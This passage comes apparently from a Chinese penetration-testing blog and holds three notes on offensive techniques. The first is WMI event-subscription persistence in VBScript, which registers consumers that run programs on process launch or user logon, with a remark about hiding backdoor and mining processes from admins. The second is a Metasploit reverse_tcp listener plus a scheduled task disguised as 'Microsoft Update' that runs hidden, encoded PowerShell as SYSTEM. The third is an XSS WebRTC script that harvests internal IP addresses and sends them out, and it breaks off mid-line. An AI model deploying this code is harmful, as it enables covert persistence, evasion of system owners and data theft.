mechanism for specifying credentials.</li><li>Connect to WMI if you are runing a WMI script from within a Web page.</li></ol><p>创建对象并连接服务器：</p><pre class="line-numbers language-none"><code class="language-none">set objlocator&#x3D;createobject(&quot;wbemscripting.swbemlocator&quot;)set objswbemservices&#x3D;objlocator.connectserver(ipaddress,&quot;root\default&quot;,username,password)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问WMI还有一个特权的额问题。</p><pre class="line-numbers language-none"><code class="language-none">objswbemservices.security_.privileges.add 23,trueobjswbemservices.security_.privileges.add 18,true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这是在向WMI服务申请权限，18和23都是权限代号，以下是重要的代号:<br>5 在域中创建账号<br>7 管理审计并查看、保存和清理安全日志<br>9 加载和卸载设备驱动<br>10 记录系统时间<br>11 改变系统时间<br>18 在本地关机<br>22 绕过历遍检查<br>23 允许远程关机</p><p>运行如下脚本可以获得所有权限ID及对应说明</p><pre class="line-numbers language-none"><code class="language-none">strComputer &#x3D; &quot;.&quot;set objWMIService &#x3D; GetObject(&quot;winmgmts:\\&quot; _&amp; strComputer &amp; &quot;\root\cimv2&quot;)set colPrivileges &#x3D; objWMIService.Security_.Privilegesfor I &#x3D; 1 to 27colPrivileges.Add(I)Next&#39; Display information about each privilege For Each objItem In colPrivilegeswscript.echo objItem.Identifier &amp; vbtab &amp; objItem.Name _    &amp; vbtab &amp; objItem.Displayname _    &amp; vbtab &amp; &quot;Enabled &#x3D; &quot; &amp; objItem.IsEnabledNext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">strComputer&#x3D;&quot;.&quot;set objService &#x3D; GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;)&#39;set objWmi &#x3D; CreateObject(&quot;WbemScripting.SWBemLocator&quot;)&#39;set objService &#x3D; objWmi.ConnectServer(strComputer, &quot;root\cimv2&quot;)set objSet &#x3D; objService.InstancesOf(&quot;Win32_Process&quot;)for each obj in objSet    Wscript.Echo &quot;Name: &quot; &amp; obj.NameNext<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wmi是事件驱动，整个事件处理机制分4个部分:<br>1、事件生产者（provider)，负责生产事件。WMI包含大量事件生产者。<br>2、事件过滤器(fileter），系统每时每刻有大量的事件，通过自定义过滤器，脚本可以捕获感兴趣的事件进行处理。<br>3、事件消费者（consumer)：负责处理事件，他是由可执行程序，动态链接库(dll，由wmi服务加载)或者脚本<br>4、事件绑定(binding）：通过将过滤器和消费者绑定，明确什么事件由什么消费者负责处理</p><p>事件消费者可以分为临时和永久两类，临时的事件消费者只在其运行期间关心特定事件并处理，永久消费者作为类的实例注册在WMI命名空间中，一直有效到它被注销。</p><h4 id="EvenetFilter"><a href="#EvenetFilter" class="headerlink" title="EvenetFilter"></a>EvenetFilter</h4><p>1: Data queries</p><p><code>select * from Win32_NTlogEvent where logfile = &#39;application&#39;</code><br>辣么，上面这个语句是否可以修改下，类似远程控制iptables的方式，当检测到logfile里面存在特定字符，触发事件</p><p>2: Evenet queries</p><p><code>select * from __InstanceModificationEvent WITHIN 10 where TargetInstance ISA &#39;Win32_Service&#39; AND TargetInstance._Class = &#39;win32_TerminalService&#39;</code></p><p>3: Schema queries</p><p><code>select * from meta_class where __this ISA &quot;Win32_BaseService&quot;</code></p><h4 id="consumer"><a href="#consumer" class="headerlink" title="consumer"></a>consumer</h4><p>可以理解为满足条件之后执行的操作，包括如下查询:</p><pre class="line-numbers language-none"><code class="language-none">（1） ActiveScriptEventConsumer (2) LogFileEventConsumer (3) NTEventLogEventConsumer (4) SMTPEventConsumer (5) CommandLineEventConsumer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wmi需要两个可以执行，Eventfilter和consumer。</p><p>EventFilter</p><pre class="line-numbers language-none"><code class="language-none">select * from __InstanceModificationEvent where TargetInstance Isa &quot;Win32_localTime&quot; And TargetInstance.Second &#x3D; 1select * from __InstanceModificationEvent WITHIN 10 where TargetInstance ISA &#39;Win32_Service&#39; AND TargetInstance._Class &#x3D; &#39;win32_TerminalService&#39;select * from _InstanceModificationEvent within 5 where Targetinstance ISA &#39;Win32_service&#39; AND TargetInstance.name &#x3D; &#39;spooler&#39; and Targetinstatnce.state&#x3D;&#39;stopped&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2003系统上，一个用户登陆的时候，日志记录ID是680，注销断开的时候ID是551，所以当一个用户登陆的时候，wmi监测登陆id，如果登陆成功，杀掉后们和挖矿进程。<br>杀掉进程有这么几个条件，任何一个成立都杀掉：</p><p>用户成功登陆<br>打开任务管理器<br>打开cmd</p><p>所以，说了这么多，这个vbs脚本应该怎么写？</p><ol><li>vbs脚本运行其他程序，比如cmd</li><li>满足条件之后绑定消费事件</li></ol><p>WMI提供了两个计时器：<code>__AbsoluteTimerInstruction</code>和<code>__IntervalTimerInstruction</code></p><p>WMI提供了三个类别的WQL查询：</p><ol><li><p>实例查询  －－用于查询WMI类的实例</p><pre class="line-numbers language-none"><code class="language-none">select &lt;class property name&gt; from &lt;class name&gt; where &lt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>事件查询  －－用于一个WMI事件注册机制，如WMI对象的创建，修改或删除</p></li></ol><pre class="line-numbers language-none"><code class="language-none">交互式用户登录的事件查询：SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA &#39;Win32_LogonSession&#39; AND TargetInstance.LogonType &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>元查询    －－用于查询WMI类架构</li></ol><pre class="line-numbers language-none"><code class="language-none">select * from Meta_classes where __class like &quot;win32%&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例子:</p><p>每10s查询一次事件修改，记录</p><pre class="line-numbers language-none"><code class="language-none">strComputer &#x3D; &quot;.&quot; Set objWMIService &#x3D; GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;) Set colMonitorProcess &#x3D; objWMIService.ExecNotificationQuery _  (&quot;SELECT * FROM __instancemodificationevent WITHIN 10&quot; &amp; _  &quot;WHERE TargetInstance ISA &#39;Win32_Service&#39;&quot;)  WScript.Echo &quot;Waiting for process change event ...&quot; Set objLatestEvent &#x3D; colMonitorProcess.NextEvent WScript.Echo VbCrLf &amp; objLatestEvent.Path_.Class Wscript.Echo &quot;Process Name: &quot; &amp; objLatestEvent.TargetInstance.Name Wscript.Echo &quot;Process ID: &quot; &amp; objLatestEvent.TargetInstance.ProcessId Wscript.Echo &quot;Process State:&quot; &amp; objLatestEvent.TargetInstance.stateWScript.Echo &quot;Time: &quot; &amp; Now <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下来自鬼哥的文章：<a href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p><p>稍微修改了下，大概功能就是打开任务管理器的时候，5s之内会打开calc.exe，这个动作可以在process explorer里面监测到。<br>脚本稍微不同的地方是:</p><p><code>__EventFilter</code>的时候，要制定命名空间为<code>root\cimv2</code>,整个脚本是注册在<code>root\subscription</code>里面的。</p><p>一句话:<br>以<code>root\cimv2</code>空间的事件为驱动，使用<code>root\subscription</code>空间里面的<code>CommandLineEventConsumer</code>来运行程序。</p><pre class="line-numbers language-none"><code class="language-none">nslink&#x3D;&quot;winmgmts:\\.\root\cimv2:&quot;         &#39;只需要本地连接，所以用这种语法，不用swbemlocator对象&#39;nslink2&#x3D;&quot;winmgmts:\\.\root\subscription:&quot;set asec&#x3D;getobject(nslink2&amp;&quot;CommandLineEventConsumer&quot;).spawninstance_   &#39;创建“活动脚本事件消费者”&#39;asec.name&#x3D;&quot;stopped_spooler_restart_consumer&quot;                  &#39;定义消费者的名字&#39;&#39;asec.scriptingengine&#x3D;&quot;vbscript&quot;                               &#39;定义脚本语言(只能是vbscript)&#39;asec.CommandLineTemplate&#x3D;&quot;C:\windows\system32\calc.exe&quot;  &#39;脚本代码&#39;asec.ExecutablePath&#x3D;&quot;C:\windows\system32\calc.exe&quot;set asecpath&#x3D;asec.put_                                        &#39;注册消费者，返回其链接&#39;set evtflt&#x3D;getobject(nslink2&amp;&quot;__EventFilter&quot;).spawninstance_   &#39;创建事件过滤器&#39;evtflt.name&#x3D;&quot;stopped_spooler_filter&quot; evtflt.EventNameSpace&#x3D;&quot;root\cimv2&quot;                         &#39;定义过滤器的名字&#39;qstr&#x3D;&quot;select * from __InstanceCreationEvent within 5 &quot;    &#39;每5秒查询一次“实例修改事件”&#39;qstr&#x3D;qstr&amp;&quot;where targetinstance isa &#39;win32_process&#39; and &quot;   &#39;目标实例的类是win32_process&#39;qstr&#x3D;qstr&amp;&quot;targetinstance.name&#x3D;&#39;taskmgr.exe&#39; &quot;                  &#39;实例名是taskmgr.exe&#39;evtflt.query&#x3D;qstr                                             &#39;定义查询语句&#39;evtflt.querylanguage&#x3D;&quot;wql&quot;                                    &#39;定义查询语言(只能是wql)&#39;set fltpath&#x3D;evtflt.put_                                       &#39;注册过滤器，返回其链接&#39;set fcbnd&#x3D;getobject(nslink2&amp;&quot;__FilterToConsumerBinding&quot;).spawninstance_  &#39;创建过滤器和消费者的绑定&#39;fcbnd.consumer&#x3D;asecpath.path                                            &#39;指定消费者&#39;fcbnd.filter&#x3D;fltpath.path                                               &#39;指定过滤器&#39;fcbnd.put_                                                              &#39;执行绑定&#39;wscript.echo &quot;success&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面提到过有5种消费者，然后这次以LogFileEventConsumer来测试，打开任务管理器之后，在C盘根目录下生成1.php，内容是<code>&lt;?php phpinfo();?&gt;</code>:</p><pre class="line-numbers language-none"><code class="language-none">nslink&#x3D;&quot;winmgmts:\\.\root\cimv2:&quot;         &#39;只需要本地连接，所以用这种语法，不用swbemlocator对象&#39;nslink2&#x3D;&quot;winmgmts:\\.\root\subscription:&quot;set asec&#x3D;getobject(nslink2&amp;&quot;LogFileEventConsumer&quot;).spawninstance_   &#39;创建“活动脚本事件消费者”&#39;asec.name&#x3D;&quot;stopped_spooler_restart_consumer&quot;                  &#39;定义消费者的名字&#39;&#39;asec.scriptingengine&#x3D;&quot;vbscript&quot;                               &#39;定义脚本语言(只能是vbscript)&#39;&#39;asec.CommandLineTemplate&#x3D;&quot;C:\windows\system32\calc.exe&quot;  &#39;脚本代码&#39;&#39;asec.ExecutablePath&#x3D;&quot;C:\windows\system32\calc.exe&quot;asec.Filename&#x3D;&quot;C:\1.php&quot;asec.Text&#x3D;&quot;&lt;?php phpinfo();?&gt;&quot;set asecpath&#x3D;asec.put_                                        &#39;注册消费者，返回其链接&#39;set evtflt&#x3D;getobject(nslink2&amp;&quot;__EventFilter&quot;).spawninstance_   &#39;创建事件过滤器&#39;evtflt.name&#x3D;&quot;stopped_spooler_filter&quot; evtflt.EventNameSpace&#x3D;&quot;root\cimv2&quot;                         &#39;定义过滤器的名字&#39;qstr&#x3D;&quot;select * from __InstanceCreationEvent within 5 &quot;    &#39;每5秒查询一次“实例修改事件”&#39;qstr&#x3D;qstr&amp;&quot;where targetinstance isa &#39;win32_process&#39; and &quot;   &#39;目标实例的类是win32_service&#39;qstr&#x3D;qstr&amp;&quot;targetinstance.name&#x3D;&#39;taskmgr.exe&#39; &quot;                  &#39;实例名是spooler&#39;evtflt.query&#x3D;qstr                                             &#39;定义查询语句&#39;evtflt.querylanguage&#x3D;&quot;wql&quot;                                    &#39;定义查询语言(只能是wql)&#39;set fltpath&#x3D;evtflt.put_                                       &#39;注册过滤器，返回其链接&#39;set fcbnd&#x3D;getobject(nslink2&amp;&quot;__FilterToConsumerBinding&quot;).spawninstance_  &#39;创建过滤器和消费者的绑定&#39;fcbnd.consumer&#x3D;asecpath.path                                            &#39;指定消费者&#39;fcbnd.filter&#x3D;fltpath.path                                               &#39;指定过滤器&#39;fcbnd.put_                                                              &#39;执行绑定&#39;wscript.echo &quot;success&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wmi监听用户登录和注销事件：</p><p>2003系统上，一个用户登陆的时候，日志记录ID是680，注销断开的时候ID是551，所以当一个用户登陆的时候，wmi监测登陆id，如果登陆成功，打开calc.exe：</p><pre class="line-numbers language-none"><code class="language-none">nslink&#x3D;&quot;winmgmts:\\.\root\cimv2:&quot;         &#39;只需要本地连接，所以用这种语法，不用swbemlocator对象&#39;nslink2&#x3D;&quot;winmgmts:\\.\root\subscription:&quot;set asec&#x3D;getobject(nslink2&amp;&quot;CommandLineEventConsumer&quot;).spawninstance_   &#39;创建“活动脚本事件消费者”&#39;asec.name&#x3D;&quot;stopped_spooler_restart_consumer&quot;                  &#39;定义消费者的名字&#39;&#39;asec.scriptingengine&#x3D;&quot;vbscript&quot;                               &#39;定义脚本语言(只能是vbscript)&#39;asec.CommandLineTemplate&#x3D;&quot;C:\windows\system32\calc.exe&quot;  &#39;脚本代码&#39;set asecpath&#x3D;asec.put_                                        &#39;注册消费者，返回其链接&#39;set evtflt&#x3D;getobject(nslink2&amp;&quot;__EventFilter&quot;).spawninstance_   &#39;创建事件过滤器&#39;evtflt.name&#x3D;&quot;stopped_spooler_filter&quot; evtflt.EventNameSpace&#x3D;&quot;root\cimv2&quot;                         &#39;定义过滤器的名字&#39;qstr&#x3D;&quot;select * from __InstanceCreationEvent within 5 &quot;    &#39;每5秒查询一次“实例修改事件”&#39;qstr&#x3D;qstr&amp;&quot;where targetinstance isa &#39;win32_NTLogEvent&#39; and &quot;   qstr&#x3D;qstr&amp;&quot;targetinstance.EventCode&#x3D;&#39;680&#39; &quot;                  &#39;实例名是win32_NTLogEvent&#39;evtflt.query&#x3D;qstr                                             &#39;定义查询语句&#39;evtflt.querylanguage&#x3D;&quot;wql&quot;                                    &#39;定义查询语言(只能是wql)&#39;set fltpath&#x3D;evtflt.put_                                       &#39;注册过滤器，返回其链接&#39;set fcbnd&#x3D;getobject(nslink2&amp;&quot;__FilterToConsumerBinding&quot;).spawninstance_  &#39;创建过滤器和消费者的绑定&#39;fcbnd.consumer&#x3D;asecpath.path                                            &#39;指定消费者&#39;fcbnd.filter&#x3D;fltpath.path                                               &#39;指定过滤器&#39;fcbnd.put_                                                              &#39;执行绑定&#39;wscript.echo &quot;success&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">在每分钟的第5s之行一次select * from __instanceModificationEvent where targetinstance ISA &#39;win32_localtime&#39; and targetinstance.Second&#x3D;5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>wmi对象在硬盘中是存储在<code>C:\Windows\System32\wbem\Repository\fs\objects.data</code></p><h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题:"></a>遗留问题:</h2><p>微软的官网有这么一段话:</p><blockquote><p>A single event filter can be associated with multiple logical event consumer. Furthermore, multiple event filters can be associated with a single logical event consumer.</p></blockquote><p>多个消费者可以对应一个filter，多个filter也可以对应一个消费者。但是实际测试并没有成功，在多个filter存在的情况下，消费未达到期望，测试代码:</p><p>测试期望是5s之内打开cmd和taskmgr的时候会打开calc.exe，实际测试未成功。</p><pre class="line-numbers language-none"><code class="language-none">nslink&#x3D;&quot;winmgmts:\\.\root\cimv2:&quot;         nslink2&#x3D;&quot;winmgmts:\\.\root\subscription:&quot;set asec&#x3D;getobject(nslink2&amp;&quot;CommandLineEventConsumer&quot;).spawninstance_   asec.name&#x3D;&quot;taskmgr_consumer&quot;                                                asec.CommandLineTemplate&#x3D;&quot;cmd &#x2F;C calc.exe&quot;  set asecpath&#x3D;asec.put_                                        set evtflt&#x3D;getobject(nslink2&amp;&quot;__EventFilter&quot;).spawninstance_   evtflt.name&#x3D;&quot;taskmgr&quot; evtflt.EventNameSpace&#x3D;&quot;root\cimv2&quot;                         qstr&#x3D;&quot;select * from __InstanceCreationEvent within 5 &quot;    qstr&#x3D;qstr&amp;&quot;where targetinstance isa &#39;win32_process&#39; and &quot;   qstr&#x3D;qstr&amp;&quot;targetinstance.name&#x3D;&#39;taskmgr.exe&#39;&quot;                evtflt.query&#x3D;qstr                                             evtflt.querylanguage&#x3D;&quot;wql&quot;                                    set fltpath&#x3D;evtflt.put_                                       &#39;set evtflt2&#x3D;getobject(nslink2&amp;&quot;__EventFilter&quot;).spawninstance_   &#39;evtflt2.name&#x3D;&quot;taskmgr2&quot; &#39;evtflt2.EventNameSpace&#x3D;&quot;root\cimv2&quot;                         &#39;qstr2&#x3D;&quot;select * from __InstanceCreationEvent within 5 &quot;    &#39;qstr2&#x3D;qstr2&amp;&quot;where targetinstance isa &#39;win32_process&#39; and &quot;   &#39;qstr2&#x3D;qstr2&amp;&quot;targetinstance.name&#x3D;&#39;cmd.exe&#39; &quot;                &#39;evtflt2.query&#x3D;qstr2                                             &#39;evtflt2.querylanguage&#x3D;&quot;wql&quot;                                    &#39;set fltpath2&#x3D;evtflt2.put_  set fcbnd&#x3D;getobject(nslink2&amp;&quot;__FilterToConsumerBinding&quot;).spawninstance_  fcbnd.consumer&#x3D;asecpath.path                                            fcbnd.filter&#x3D;fltpath.path                                               fcbnd.put_                &#39;fcbnd.filter&#x3D;fltpath2.path&#39;fcbnd.put_                                              wscript.echo &quot;success&quot;&#39;set fcbnd&#x3D;getobject(nslink2&amp;&quot;__FilterToConsumerBinding&quot;).spawninstance_  &#39;fcbnd.consumer&#x3D;asecpath.path                                            &#39;fcbnd.filter&#x3D;fltpath2.path                                               &#39;fcbnd.put_                                                              &#39;wscript.echo &quot;success2&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面这个脚本是用来监控事件变化的，可以根据需要自己修改。</p><pre class="line-numbers language-none"><code class="language-none">strComputer &#x3D; &quot;.&quot; Set objWMIService &#x3D; GetObject(&quot;winmgmts:\\&quot; &amp; strComputer &amp; &quot;\root\cimv2&quot;) Set colMonitorProcess &#x3D; objWMIService.ExecNotificationQuery _  (&quot;SELECT * FROM __instanceCreationEvent WITHIN 5&quot; &amp; _  &quot;WHERE TargetInstance ISA &#39;win32_NTLogEvent&#39;&quot;)  WScript.Echo &quot;Waiting for process change event ...&quot; while 1&gt;0Set objLatestEvent &#x3D; colMonitorProcess.NextEvent WScript.Echo VbCrLf &amp; objLatestEvent.Path_.Class Wscript.Echo &quot;Process Name: &quot; &amp; objLatestEvent.TargetInstance.EventCode Wscript.Echo &quot;Process ID: &quot; &amp; objLatestEvent.TargetInstance.Categorystring WScript.Echo &quot;Time: &quot; &amp; Now wend&#39;__instanceDeletionEvent&#39;__instanceModificationEvent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="https://msdn.microsoft.com/en-us/library/mt703459(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/mt703459(v=vs.85).aspx</a></li><li><a href="https://msdn.microsoft.com/en-us/library/aa393719(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/aa393719(v=vs.85).aspx</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-8189.html">http://wooyun.jozxing.cc/static/drops/tips-8189.html</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-12354.html">http://wooyun.jozxing.cc/static/drops/tips-12354.html</a></li><li><a href="https://www.sans.org/summit-archives/file/summit-archive-1492184420.pdf">https://www.sans.org/summit-archives/file/summit-archive-1492184420.pdf</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>powershell定时任务后门</title>
      <link href="/2017/05/24/schtasks%E5%AE%9A%E6%97%B6%E5%90%8E%E9%97%A8.html"/>
      <url>/2017/05/24/schtasks%E5%AE%9A%E6%97%B6%E5%90%8E%E9%97%A8.html</url>
      
        <content type="html"><![CDATA[<p>windows下查询定时任务，会出现无法加载列资源的情况：</p><p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p><pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有taskschtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>一种是定时任务，但是执行powershell的时候会弹窗<br><a href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p><p><a href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <UserId>NT AUTHORITY\SYSTEM</UserId> 即可</p><pre class="line-numbers language-none"><code class="language-none">Dim shell,commandcommand &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>msf接收多个shell可以如下这样做：</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.1.117set LPORT 31337set ExitOnSession falseexploit -j -z或者上面的保存为listener.rc，然后msfconsole启动msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>XML文件如下:</p><pre class="line-numbers language-none"><code class="language-none">&lt;!-- \Microsoft Update --&gt;&lt;Task version&#x3D;&quot;1.2&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mit&#x2F;task&quot;&gt;  &lt;RegistrationInfo&gt;    &lt;Date&gt;2016-05-25T11:22:53&lt;&#x2F;Date&gt;    &lt;Author&gt;Microsoft Update&lt;&#x2F;Author&gt;  &lt;&#x2F;RegistrationInfo&gt;  &lt;Triggers&gt;    &lt;TimeTrigger&gt;      &lt;Repetition&gt;        &lt;Interval&gt;PT15M&lt;&#x2F;Interval&gt;        &lt;StopAtDurationEnd&gt;false&lt;&#x2F;StopAtDurationEnd&gt;      &lt;&#x2F;Repetition&gt;      &lt;StartBoundary&gt;2017-05-30T18:22:52&lt;&#x2F;StartBoundary&gt;      &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;    &lt;&#x2F;TimeTrigger&gt;  &lt;&#x2F;Triggers&gt;  &lt;Principals&gt;    &lt;Principal id&#x3D;&quot;Author&quot;&gt;      &lt;UserId&gt;NT AUTHORITY\SYSTEM&lt;&#x2F;UserId&gt;      &lt;LogonType&gt;InteractiveToken&lt;&#x2F;LogonType&gt;      &lt;RunLevel&gt;LeastPrivilege&lt;&#x2F;RunLevel&gt;    &lt;&#x2F;Principal&gt;  &lt;&#x2F;Principals&gt;  &lt;Settings&gt;    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;&#x2F;MultipleInstancesPolicy&gt;    &lt;DisallowStartIfOnBatteries&gt;true&lt;&#x2F;DisallowStartIfOnBatteries&gt;    &lt;StopIfGoingOnBatteries&gt;true&lt;&#x2F;StopIfGoingOnBatteries&gt;    &lt;AllowHardTerminate&gt;true&lt;&#x2F;AllowHardTerminate&gt;    &lt;StartWhenAvailable&gt;false&lt;&#x2F;StartWhenAvailable&gt;    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;&#x2F;RunOnlyIfNetworkAvailable&gt;    &lt;IdleSettings&gt;      &lt;StopOnIdleEnd&gt;true&lt;&#x2F;StopOnIdleEnd&gt;      &lt;RestartOnIdle&gt;false&lt;&#x2F;RestartOnIdle&gt;    &lt;&#x2F;IdleSettings&gt;    &lt;AllowStartOnDemand&gt;true&lt;&#x2F;AllowStartOnDemand&gt;    &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;    &lt;Hidden&gt;false&lt;&#x2F;Hidden&gt;    &lt;RunOnlyIfIdle&gt;false&lt;&#x2F;RunOnlyIfIdle&gt;    &lt;WakeToRun&gt;false&lt;&#x2F;WakeToRun&gt;    &lt;ExecutionTimeLimit&gt;P3D&lt;&#x2F;ExecutionTimeLimit&gt;    &lt;Priority&gt;7&lt;&#x2F;Priority&gt;  &lt;&#x2F;Settings&gt;  &lt;Actions Context&#x3D;&quot;Author&quot;&gt;    &lt;Exec&gt;      &lt;Command&gt;powershell.exe&lt;&#x2F;Command&gt;      &lt;Arguments&gt;-exec bypass -nop -WindowStyle hidden -e [payload]&lt;&#x2F;Arguments&gt;    &lt;&#x2F;Exec&gt;  &lt;&#x2F;Actions&gt;&lt;&#x2F;Task&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS获取内网地址</title>
      <link href="/2017/05/23/xss-get-ip.html"/>
      <url>/2017/05/23/xss-get-ip.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p><p>代码未测试</p><pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;if (RTCPeerConnection) (function()&#123;var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);if (window.mozRTCPeerConnection)&#123;rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);&#125;;rtc.onicecandidate &#x3D; function(evt)&#123;if (evt.candidate) grepSDP(evt.candidate.candidate);&#125;;rtc.createOffer(function(offerDesc)&#123;grepSDP(offerDesc.sdp);rtc.setLocalDescription(offerDesc);&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);var addrs &#x3D; Object.create(null);addrs[&quot;0.0.0.0&quot;] &#x3D; false;function updateDisplay(newAddr)&#123;if(newAddr in addrs) return;else addrs[newAddr] &#x3D; true;var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;sendip(address);&#125;function grepSDP(sdp)&#123;var hosts &#x3D; [];sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;var parts &#x3D; line.split(&#39; &#39;),addr &#x3D; parts[4],type &#x3D; parts[7];if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;var parts &#x3D; line.split(&#39; &#39;),addr &#x3D; parts[2];updateDisplay(addr);&#125;&#125;);&#125;&#125;)();function sendip(ipaddress)&#123;var url &#x3D; 